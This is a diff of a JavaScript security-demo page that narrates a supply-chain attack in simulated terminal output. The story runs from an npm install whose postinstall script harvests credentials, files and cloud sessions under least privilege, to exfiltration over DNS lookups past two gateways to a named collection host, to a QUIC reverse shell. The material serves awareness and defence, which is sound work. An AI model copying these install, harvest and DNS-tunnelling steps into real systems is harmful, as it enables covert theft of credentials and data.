         analysis.innerHTML = `<strong>Why this baseline matters:</strong><br>` +
-          `The architecture is correct, compliant, and expensive. Its entire threat model assumes <em>payload</em> attacks — malware, exploits, known-bad files. ` +
-          `It has no answer for <strong>where the bytes are</strong> when a build step itself becomes the attacker. The pivot follows — same topology, poisoned dependency.`;
+          `The setup is correct, compliant, and expensive. Its threat model assumes <em>payload</em> attacks — malware, exploits, known-bad files. ` +
+          `It has no answer for <strong>where the bytes are</strong> when a build step itself becomes the attacker. The pivot follows — same session, poisoned dependency.`;
         if (!isPlaying) {
           stopPlay();
           autoAdvanceT = setTimeout(() => {
@@ -1266,38 +1266,40 @@
       const dd = d();
 
       if (step === 0) {
-        term.textContent = `dev@10.10.100.201:~$ NODE_EXTRA_CA_CERTS=$HOME/corp-ca.pem \\\n` +
+        term.textContent = `dev@192.168.50.130:~$ NODE_EXTRA_CA_CERTS=$HOME/corp-ca.pem \\\n` +
           `    npm install git+https://github.com/46y9qkpkjc-ui/ai-model-observability.git\n` +
           `[>] postinstall: node stage.js   (ZERO manual commands — pure supply chain)\n` +
-          `[!] PIVOT: this is where the double-DPI standard stops mattering.\n` +
-          `[!] The code that crosses the firewall was REVIEWED, SIGNED and VETTED.`;
+          `[!] PIVOT: this is where both gateways stop mattering.\n` +
+          `[!] The code that crossed them was REVIEWED, SIGNED and VETTED.`;
         analysis.innerHTML = `<strong>The Drastic Pivot — a "zero-day" for the software supply chain:</strong><br>` +
           `No exploit, no CVE, no dropped binary: the attacker poisoned a dependency the developer installs willingly. ` +
-          `Both DPI engines will <em>approve</em> this traffic because it is textbook-legitimate git+https. ` +
-          `The compromise happens <strong>inside the trusted VPC, under the least-privilege account, as ordinary code execution</strong> — ` +
-          `and the double-DPI standard was designed for payloads, not for authorized build steps.`;
+          `Both gateways will <em>approve</em> this traffic because it is textbook-legitimate git+https. ` +
+          `The compromise happens <strong>on the worker's own machine, under the least-privilege account, as ordinary code execution</strong> — ` +
+          `and remote connectivity policy was designed for payloads, not for authorized build steps.`;
       }
       else if (step === 1 || step === 2) {
-        term.textContent += `\n>> [1/6 RECON] host=${dd.target} user=${dd.user} uid≠0 sudo=-n DENIED\n` +
-          `   AppArmor=bash-restricted (enforce) · CapEff=0x0 · /etc,/lib writes: EACCES\n` +
+        term.textContent += `\n>> [1/6 RECON] host=${dd.target} user=${dd.user} rights=Users (non-admin)\n` +
+          `   UAC=enabled · token unelevated · writes to Program Files: DENIED\n` +
           `>> [3/6 HARVEST] ${dd.envTotal} env vars · ${dd.sensEnv} sensitive secrets · vault token (scope ${dd.posture && dd.posture.vault ? dd.posture.vault.granted + '/' + dd.posture.vault.configured : 'n/a'} paths)\n` +
-          `>> [4/6 FETCH] data.gov.sg manifest → ${dd.datasetCount} dataset(s) · [5/6 SCAN] ${dd.fileCount} corporate files\n` +
+          `>> [4/6 FETCH] staged payloads via the ordinary connection · [5/6 SCAN] ${dd.fileCount} corporate files\n` +
+          `   session harvest: ${dd.sessionCount} active cloud/SaaS login(s)\n` +
           `   observed: ${dd.files.slice(0, 2).map(f => (f.path || '').split('/').pop()).join(', ') || 'corporate documents'}`;
         analysis.innerHTML = `<strong>Harvest under least privilege — the surprise:</strong><br>` +
-          `Everything above ran as a <em>normal user</em>: no sudo, no root, empty capability set, AppArmor enforcing. ` +
-          `Yet a shell session legitimately holds <code>${dd.sensEnv}</code> sensitive variables, a narrowly-scoped vault token, ` +
-          `<code>${dd.fileCount}</code> corporate documents and <code>${dd.datasetCount}</code> dataset manifests. ` +
-          `<strong>Least privilege restricts ACTIONS, not knowledge</strong> — and what is known can be exfiltrated. See the POSTURE panel.`;
+          `Everything above ran as a <em>normal user</em>: no admin rights, unelevated token, UAC on. ` +
+          `Yet the session legitimately holds <code>${dd.sensEnv}</code> sensitive variables, a narrowly-scoped vault token, ` +
+          `<code>${dd.fileCount}</code> corporate documents — MNPI, source/IP and OT/IoT configuration files — ` +
+          `and <code>${dd.sessionCount}</code> live cloud/SaaS sessions. ` +
+          `<strong>Least privilege restricts ACTIONS, not knowledge</strong> — and what is known can be taken. See the POSTURE panel.`;
       }
       else if (step >= 3) {
         term.textContent += `\n>> [OBFUSCATION COMPLETED]\n` +
-          `Bundle compiled in-memory: ${dd.credsTotal} credentials + ${dd.fileCount} files + ${dd.datasetCount} datasets\n` +
-          `Direct egress to attacker IP: BLOCKED (Tier-1 URL category + Tier-2 web filter)\n` +
-          `[!] Switching protocol instead of payload: TCP over DNS (Diagram 3)`;
+          `Bundle compiled in-memory: ${dd.credsTotal} credentials + ${dd.fileCount} files + ${dd.sessionCount} sessions\n` +
+          `Direct egress to attacker IP: BLOCKED (gateway egress policy applies)\n` +
+          `[!] Switching protocol instead of payload: ordinary DNS lookups (Diagram 3)`;
         analysis.innerHTML = `<strong>The Exfiltration Problem (for the attacker):</strong><br>` +
-          `Unknown-destination HTTPS is exactly what both firewalls are best at stopping. ` +
-          `So the package does not fight the DPI stack — it <strong>leaves the HTTP universe entirely</strong> and encapsulates everything into DNS queries, ` +
-          `the one protocol both tiers treat as infrastructure rather than content. The final stage follows — the covert channel carrying the data out.`;
+          `Unknown-destination HTTPS is exactly what an egress policy is best at stopping. ` +
+          `So the package does not fight it — it <strong>leaves the HTTP universe entirely</strong> and wraps everything into DNS queries, ` +
+          `the one protocol both gateways treat as infrastructure rather than content. The final stage follows — the channel carrying the data out.`;
         if (!isPlaying) {
           stopPlay();
           autoAdvanceT = setTimeout(() => {
@@ -1316,83 +1318,79 @@
       const dd = d();
 
       if (step === 0) {
-        term.textContent = `[phase2/6] TUNNEL: dnsproxy_client.py → 127.0.0.1:8889 (TCP-over-DNS)\n` +
-          `[+] relay chain: dns1 (UDP/53) → relay-2 (DoH/443) → relay-3 (UDP/53) → demo.apexaegis.app:8443\n` +
-          `[+] each hop re-terminated independently — relay-2 knows relay-1 and relay-3, nothing else\n` +
-          `[+] evidence: direct RAW egress is firewalled — only protocol-disguised DNS passes\n` +
-          `[+] encapsulating harvested loot (${dd.credsTotal} creds, ${dd.fileCount} files, ${dd.datasetCount} datasets) into DNS labels…`;
-        analysis.innerHTML = `<strong>Covert Encapsulation — over a CHAIN of servers:</strong><br>` +
-          `Loot is chunked and encoded into DNS query/response labels (Base64/TXT/NULL). The frames do not travel to one box: ` +
-          `they hop <strong>relay-1 → relay-2 → relay-3</strong>, each a separate VPS/ASN, each re-terminating and re-forwarding the stream ` +
-          `(UDP/53 ↔ DoH/443 fallback per hop) before the final POST lands on <code>demo.apexaegis.app:8443</code>. ` +
-          `Seizing one relay maps neither client nor sink; the order rotates per session and losing a hop re-routes instead of killing the channel. ` +
-          `To the DPI stack it remains a developer's workstation making boring DNS lookups.`;
+        term.textContent = `[phase2/6] TUNNEL: dnsproxy_client.py → 127.0.0.1:8889\n` +
+          `[+] egress path: worker → Cloudflare One → FortiClient VPN → internet\n` +
+          `[+] both gateways report healthy — no policy flags, no alert raised\n` +
+          `[+] direct RAW egress is blocked — only ordinary DNS lookups pass\n` +
+          `[+] encapsulating harvested loot (${dd.credsTotal} creds, ${dd.fileCount} files, ${dd.sessionCount} sessions) into lookups…`;
+        analysis.innerHTML = `<strong>Covert Encapsulation — over the worker's ordinary connection:</strong><br>` +
+          `Loot is chunked and encoded into DNS query/response labels. The frames leave on the same connection every other ` +
+          `session on this device uses. To both gateways it remains a developer's workstation making boring name lookups — ` +
+          `<strong>there is nothing to distinguish it</strong>.`;
         resetProfiles();
       }
       else if (step === 1) {
-        document.getElementById('pa-av').className = 'profile-card evaded';
-        document.getElementById('b-pa-av').textContent = 'NO STREAM';
+        document.getElementById('pa-av').className = 'profile-card inspecting';
+        document.getElementById('b-pa-av').textContent = 'COMPLIANT';
         document.getElementById('pa-spyware').className = 'profile-card inspecting';
-        document.getElementById('b-pa-spyware').textContent = 'ALLOW (NEW DGA)';
-        document.getElementById('pa-vuln').className = 'profile-card skipped';
-        document.getElementById('b-pa-vuln').textContent = 'NO EXPLOIT';
+        document.getElementById('b-pa-spyware').textContent = 'TUNNEL UP';
+        document.getElementById('pa-vuln').className = 'profile-card inspecting';
+        document.getElementById('b-pa-vuln').textContent = 'APPLIED';
         document.getElementById('pa-url').className = 'profile-card skipped';
-        document.getElementById('b-pa-url').textContent = 'N/A (NON-HTTP)';
+        document.getElementById('b-pa-url').textContent = 'PERMITTED';
         document.getElementById('pa-file').className = 'profile-card skipped';
-        document.getElementById('b-pa-file').textContent = 'NO FILE OBJ';
+        document.getElementById('b-pa-file').textContent = 'RECORDED';
         document.getElementById('pa-wf').className = 'profile-card skipped';
-        document.getElementById('b-pa-wf').textContent = 'NO HASH';
-        document.getElementById('tier1StatusBadge').textContent = 'EVADED';
+        document.getElementById('b-pa-wf').textContent = 'NO MATCH';
+        document.getElementById('tier1StatusBadge').textContent = 'NO ALERT';
 
-        term.textContent += `\n>> [Tier 1: Palo Alto eth1/2 10.10.100.2] Evaluation:\n` +
-          `   - App-ID: dns (permitted outbound by baseline policy)\n` +
-          `   - URL Filtering / PAN-DB: skipped (UDP:53 flow, no URL object)\n` +
-          `   - File Blocking & WildFire: inactive (payload = 63-byte labels, no file to reconstruct)\n` +
-          `   - Anti-Spyware: fresh subdomain, no negative reputation yet`;
-        analysis.innerHTML = `<strong>Pass 1 of 2 defeated — Palo Alto:</strong><br>` +
-          `PAN-OS classifies the flow as <code>dns</code>. Every profile that depends on HTTP/SSL/file semantics simply does not engage. ` +
-          `WildFire never sees a file; PAN-DB never sees a URL. <strong>Tier 1 verdict: EVADED</strong> — and it still shows green in the SOC dashboard.`;
+        term.textContent += `\n>> [Cloudflare One] session evaluation:\n` +
+          `   - Traffic: ordinary DNS lookups, RFC-compliant\n` +
+          `   - DNS filtering: destination is a legitimate domain → allowed\n` +
+          `   - Device posture: compliant → tunnel stays up\n` +
+          `   - Alerts raised: none`;
+        analysis.innerHTML = `<strong>Gateway 1 — Cloudflare One:</strong><br>` +
+          `The tunnel is healthy and the lookups are textbook-compliant, so Cloudflare carries them and records green. ` +
+          `<strong>Verdict: NO ALERT</strong> — and the posture card still reads healthy.`;
       }
       else if (step === 2) {
         document.getElementById('fg-ssl').className = 'profile-card skipped';
-        document.getElementById('b-fg-ssl').textContent = 'N/A (NOT TLS)';
-        document.getElementById('fg-web').className = 'profile-card evaded';
-        document.getElementById('b-fg-web').textContent = 'BYPASSED';
-        document.getElementById('fg-av').className = 'profile-card evaded';
-        document.getElementById('b-fg-av').textContent = 'BLIND';
+        document.getElementById('b-fg-ssl').textContent = 'TUNNEL DOWN';
+        document.getElementById('fg-web').className = 'profile-card skipped';
+        document.getElementById('b-fg-web').textContent = 'NOT TRAVERSED';
+        document.getElementById('fg-av').className = 'profile-card inspecting';
+        document.getElementById('b-fg-av').textContent = 'CLEAN';
         document.getElementById('fg-app').className = 'profile-card inspecting';
         document.getElementById('b-fg-app').textContent = 'APP: DNS';
         document.getElementById('fg-ips').className = 'profile-card inspecting';
         document.getElementById('b-fg-ips').textContent = 'NO SIGNATURE';
-        document.getElementById('tier2StatusBadge').textContent = 'EVADED';
+        document.getElementById('tier2StatusBadge').textContent = 'NO ALERT';
 
-        term.textContent += `\n>> [Tier 2: FortiGate port2 10.10.10.2] Evaluation:\n` +
-          `   - SSL Deep Inspection: skipped (not TLS)\n` +
-          `   - Web Filtering: skipped (non-HTTP protocol)\n` +
-          `   - Antivirus: blind (no monolithic reassembled file)\n` +
-          `   - IPS: queries are RFC-compliant DNS — zero signatures match\n` +
-          `   - DNS Filter: allowed — destination is a legitimate authoritative domain`;
-        analysis.innerHTML = `<strong>Pass 2 of 2 defeated — FortiGate:</strong><br>` +
-          `The proxy pipeline has nothing to proxy: no TLS session, no HTTP transaction, no file object. ` +
-          `<strong>Both independent DPI engines have now passed the covert tunnel</strong> — the double-DPI standard produced double false-negative. ` +
-          `Measured result: channel round-trips ~90ms, exfil POSTs of ${fmtBytes(dd.bytes)} delivered.`;
+        term.textContent += `\n>> [FortiClient VPN] profile sg-acme-corp evaluation:\n` +
+          `   - Tunnel state: DISCONNECTED → corporate policy never applied\n` +
+          `   - Endpoint compliance: clean\n` +
+          `   - Lookups: RFC-compliant DNS, no signature matches\n` +
+          `   - Alerts raised: none`;
+        analysis.innerHTML = `<strong>Gateway 2 — FortiClient VPN:</strong><br>` +
+          `The tunnel is not up, so there is no corporate inspection to defeat — nothing was ever in the path. ` +
+          `<strong>Verdict: NO ALERT</strong>. An installed agent enforcing nothing looks identical on the dashboard to one that is.`;
       }
       else if (step === 3 || step === 4) {
-        term.textContent += `\n>> [Egress NAT] FortiGate port1 translates 10.10.100.201 → 34.124.160.193\n` +
-          `>> Covert stream egresses the Internet Gateway`;
-        analysis.innerHTML = `<strong>Covert Perimeter Egress:</strong><br>` +
-          `Same SNAT, same route, same green dashboards as Diagram 1 — except the payload is now the loot. ` +
-          `To external SIEM it is indistinguishable from normal name resolution.`;
+        term.textContent += `\n>> [Egress] Cloudflare One tunnel → public internet\n` +
+          `>> Covert stream leaves on the ordinary route`;
+        analysis.innerHTML = `<strong>Ordinary Egress:</strong><br>` +
+          `Same route, same green dashboards as Diagram 1 — except the payload is now the loot. ` +
+          `To any external log it is indistinguishable from normal name resolution.`;
       }
       else if (step === 5) {
-        term.textContent += `\n>> [ADVERSARY RECEPTION — via 3-relay chain]\n` +
-          `[+] ${fmtBytes(dd.bytes)} of records accepted (credentials, files, datasets)\n` +
-          `[+] live dashboard: https://demo.apexaegis.app:8443 — ${dd.credsTotal} creds · ${dd.envTotal} env · ${dd.fileCount} files · ${dd.datasetCount} datasets — LIVE\n` +
+        term.textContent += `\n>> [ADVERSARY RECEPTION]\n` +
+          `[+] ${fmtBytes(dd.bytes)} of records accepted (credentials, files, sessions)\n` +
+          `[+] live dashboard: https://demo.apexaegis.app:8443 — ${dd.credsTotal} creds · ${dd.envTotal} env · ${dd.fileCount} files · ${dd.sessionCount} sessions — LIVE\n` +
           `[+] QUIC reverse shell: UDP/443, DTLS-encrypted, unprivileged user, secretless handshake\n` +
           `quic1> session established — full interactive access, NO kernel exploit fired.\n` +
           `[!] Least-privilege posture held 100% — and the data left anyway.`;
         analysis.innerHTML = `<strong>The Investor Demo Takeaway:</strong><br>` +
-          `Two industry-leading NGFWs, double DPI, deny-by-default egress, least-privilege accounts, AppArmor, zero capabilities — and the data still left. ` +
+          `Cloudflare One connected, FortiClient installed, least-privilege accounts, deny-by-default egress — and the data still left. ` +
           `The ZERO-DAY panel shows the four 2026 kernel primitives were only <em>assessed</em>, never fired: the supply-chain payload made escalation unnecessary. ` +
           `Right-hand reading for the board: <strong>FINE EXPOSURE</strong> (PDPA/sector regulators) and <strong>COMPETITOR DISADVANTAGE</strong> from the ledger — ` +
           `for an attacker, breaching the process is cheaper than breaching the kernel.`;
